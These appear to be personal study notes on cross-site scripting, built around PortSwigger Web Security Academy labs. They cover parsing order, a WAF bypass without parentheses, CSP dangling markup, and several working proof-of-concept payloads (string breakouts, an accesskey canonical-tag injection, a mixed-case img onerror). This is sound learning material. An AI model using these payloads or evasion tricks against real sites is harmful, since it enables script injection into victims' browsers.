## XSS Techniques and Resources

### HTML Parsing vs JavaScript Parsing

The reason this works is that the browser first performs HTML parsing to identify the page elements, including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script from being parsed and executed in the normal way.

### WAF Bypass Without Parentheses

If a WAF doesn't allow `()`, one way to bypass this is to use the `throw` statement with an exception handler. This enables you to pass arguments to a function without using parentheses. The following code assigns the `alert()` function to the global exception handler and the `throw` statement passes `1` to the exception handler (in this case, `alert`). The result is that the `alert()` function is called with `1` as an argument.

```js
onerror=alert;throw 1
```

[Learn more](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)

### XSS Using Hidden Input Fields

[Learn more](https://portswigger.net/research/xss-in-hidden-input-fields)

### CSP and Dangling Markup

Even if CSP (Content Security Policy) is in place, there are useful techniques involving dangling markup. The key takeaway is that if CSP isn't blocking frame and base URI, the site might be vulnerable if filters can be bypassed.

[Learn more](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)  
[Evading CSP with Dangling Markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

### Lab: Reflected XSS Into a JavaScript String (HTML Encoded)

- Payload: `'-alert(1)-'`

[Learn more](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

Payload for this one was: `\"} + alert(1)//`

### Lab: Reflected XSS with Some SVG Markup Allowed

```html
<svg width="200" height="200">
  <rect x="10" y="10" width="100" height="100" fill="blue">
    <animateTransform attributeName="x" from="10" to="150" dur="5s" begin="0s" fill="freeze" 
             onbegin="console.log('Animation started!')" />
  </rect>
</svg>
```

### Lab: Canonical Link Tag XSS

- Payload: `https://0aef006d0472a828811dedef00de0029.web-security-academy.net/?'accesskey='x'onclick='alert(1)`

### Reflected XSS into a JavaScript String with Angle Brackets and Double Quotes HTML-Encoded and Single Quotes Escaped

- Payload: `';alert(1)//`

### The Most Beautiful One

- Payload (HTML Encoded): `https:');alert(1)//`
- Real Payload: `https:&apos;);alert(1)//`

**Fazit:** We can use HTML encoding in JS to close JS but not to close HTML.

### Example Payloads

```html
<img src=1 oNeRrOr=alert`1`>
```
```